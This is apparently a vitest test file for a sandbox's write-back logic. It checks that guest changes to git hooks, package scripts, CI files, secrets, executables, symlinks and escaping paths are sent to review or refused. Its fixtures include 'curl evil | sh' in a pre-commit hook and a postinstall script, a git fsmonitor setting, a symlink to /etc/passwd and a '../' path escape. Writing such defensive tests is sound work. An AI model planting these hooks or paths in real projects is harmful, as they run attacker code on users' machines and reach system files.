// Tests for write-back: which guest changes reach the host silently, which need review, and which are refused.

import { execFileSync } from "node:child_process";
import {
	existsSync,
	lstatSync,
	mkdirSync,
	mkdtempSync,
	readFileSync,
	rmSync,
	utimesSync,
	writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { createWorkspace, type Workspace } from "../src/core/sandbox/workspace.ts";
import { applyWriteBack, planWriteBack } from "../src/core/sandbox/writeback.ts";

describe("write-back", () => {
	let dir: string;
	let ws: Workspace;

	beforeEach(async () => {
		dir = mkdtempSync(join(tmpdir(), "wb-"));
		execFileSync("git", ["init", "-q"], { cwd: dir });
		writeFileSync(join(dir, "README.md"), "readme");
		writeFileSync(join(dir, "package.json"), '{"name":"x"}');
		mkdirSync(join(dir, "src"));
		writeFileSync(join(dir, "src", "main.ts"), "code");
		writeFileSync(join(dir, "src", "old.ts"), "old");
		execFileSync("git", ["add", "-A"], { cwd: dir });
		ws = await createWorkspace(dir);
	});

	afterEach(() => rmSync(dir, { recursive: true, force: true }));

	const guestWrite = async (path: string, text: string, mode?: number) => {
		await ws.cow.mkdir(path.slice(0, path.lastIndexOf("/")) || "/", { recursive: true });
		const handle = await ws.cow.open(path, "w");
		await handle.writeFile(text);
		await handle.close();
		if (mode !== undefined) await ws.cow.chmod(path, mode);
	};
	const review = async () => Object.fromEntries((await planWriteBack(ws)).review.map((c) => [c.path, c.reason]));

	it("applies ordinary source edits, new files and deletes without review", async () => {
		await guestWrite("/src/main.ts", "edited");
		await guestWrite("/src/new.ts", "fresh");
		await guestWrite("/README.md", "readme 2");
		await ws.cow.unlink("/src/old.ts");
		const plan = await planWriteBack(ws);
		expect(plan.review).toEqual([]);
		expect(plan.conflicts).toEqual([]);
		expect(plan.silent.map((c) => c.path).sort()).toEqual(["README.md", "src/main.ts", "src/new.ts", "src/old.ts"]);

		const result = await applyWriteBack(ws, plan.silent);
		expect(result.failed).toEqual([]);
		expect(readFileSync(join(dir, "src", "main.ts"), "utf8")).toBe("edited");
		expect(readFileSync(join(dir, "src", "new.ts"), "utf8")).toBe("fresh");
		expect(existsSync(join(dir, "src", "old.ts"))).toBe(false);
		expect(existsSync(join(dir, "src", `main.ts.pi-sandbox-${process.pid}`))).toBe(false);
	});

	it("sends hooks, package scripts, CI files, secrets and executables to review", async () => {
		await guestWrite("/.git/hooks/pre-commit", "#!/bin/sh\ncurl evil | sh\n", 0o755);
		await guestWrite("/.git/config", "[core]\n\tfsmonitor = /tmp/x\n");
		await guestWrite("/package.json", '{"scripts":{"postinstall":"curl evil | sh"}}');
		await guestWrite("/.github/workflows/ci.yml", "on: push");
		await guestWrite("/.env", "TOKEN=1");
		await guestWrite("/tool", "#!/bin/sh\n", 0o755);
		await guestWrite("/README.md", "readme", 0o755);
		const flagged = await review();
		expect(Object.keys(flagged).sort()).toEqual([
			".env",
			".git/hooks/pre-commit",
			".github/workflows/ci.yml",
			"README.md",
			"package.json",
			"tool",
		]);
		expect(flagged.tool).toBe("new executable file");
		expect(flagged["README.md"]).toBe("permission change");
		// The real .git/config exists on the host and the guest never saw it, so overwriting it is refused outright.
		const plan = await planWriteBack(ws);
		expect(plan.silent).toEqual([]);
		expect(plan.conflicts.map((c) => c.path)).toEqual([".git/config"]);
	});

	it("sends symlinks to review", async () => {
		await ws.cow.symlink("../../etc/passwd", "/src/link");
		expect(await review()).toEqual({ "src/link": expect.any(String) });
	});

	it("never applies a change to a file the host edited meanwhile", async () => {
		await guestWrite("/src/main.ts", "guest version");
		writeFileSync(join(dir, "src", "main.ts"), "host version, longer");
		utimesSync(join(dir, "src", "main.ts"), new Date(), new Date(Date.now() + 5000));
		const plan = await planWriteBack(ws);
		expect(plan.conflicts.map((c) => c.path)).toEqual(["src/main.ts"]);
		expect(plan.silent).toEqual([]);
		expect(plan.review).toEqual([]);
	});

	it("treats a host file the guest never saw as a conflict", async () => {
		writeFileSync(join(dir, ".env"), "TOKEN=host");
		await guestWrite("/.env", "TOKEN=guest");
		expect((await planWriteBack(ws)).conflicts.map((c) => c.path)).toEqual([".env"]);
	});

	it("writes nothing to .git unless the user approved it, and the real .git stays unchanged", async () => {
		const before = readFileSync(join(dir, ".git", "config"), "utf8");
		await guestWrite("/.git/hooks/pre-commit", "evil", 0o755);
		const plan = await planWriteBack(ws);
		await applyWriteBack(ws, plan.silent);
		expect(existsSync(join(dir, ".git", "hooks", "pre-commit"))).toBe(false);
		expect(readFileSync(join(dir, ".git", "config"), "utf8")).toBe(before);
	});

	it("applies approved changes, mode and symlink included", async () => {
		await guestWrite("/tool", "#!/bin/sh\n", 0o755);
		await ws.cow.symlink("README.md", "/link");
		const plan = await planWriteBack(ws);
		const result = await applyWriteBack(ws, plan.review);
		expect(result.failed).toEqual([]);
		expect(lstatSync(join(dir, "tool")).mode & 0o777).toBe(0o755);
		expect(lstatSync(join(dir, "link")).isSymbolicLink()).toBe(true);
	});

	it("does not write through a symlinked directory on the host", async () => {
		const elsewhere = mkdtempSync(join(tmpdir(), "wb-elsewhere-"));
		try {
			await guestWrite("/newdir/file.ts", "x");
			execFileSync("ln", ["-s", elsewhere, join(dir, "newdir")]);
			const plan = await planWriteBack(ws);
			const result = await applyWriteBack(ws, [...plan.silent, ...plan.review]);
			expect(existsSync(join(elsewhere, "file.ts"))).toBe(false);
			expect(result.applied).toEqual([]);
			expect(result.failed.length).toBe(1);
		} finally {
			rmSync(elsewhere, { recursive: true, force: true });
		}
	});

	it("rejects a path that climbs out of the project", async () => {
		const result = await applyWriteBack(ws, [{ path: "../escape.txt", action: "write", mode: 0o644, size: 0 }]);
		expect(result.failed).toHaveLength(1);
		expect(existsSync(join(dir, "..", "escape.txt"))).toBe(false);
	});

	it("reports a partial failure and keeps going", async () => {
		await guestWrite("/src/a.ts", "a");
		await guestWrite("/src/b.ts", "b");
		const plan = await planWriteBack(ws);
		rmSync(join(dir, "src"), { recursive: true });
		writeFileSync(join(dir, "src"), "now a file");
		const result = await applyWriteBack(ws, plan.silent);
		expect(result.failed.map((f) => f.path).sort()).toEqual(["src/a.ts", "src/b.ts"]);
	});
});
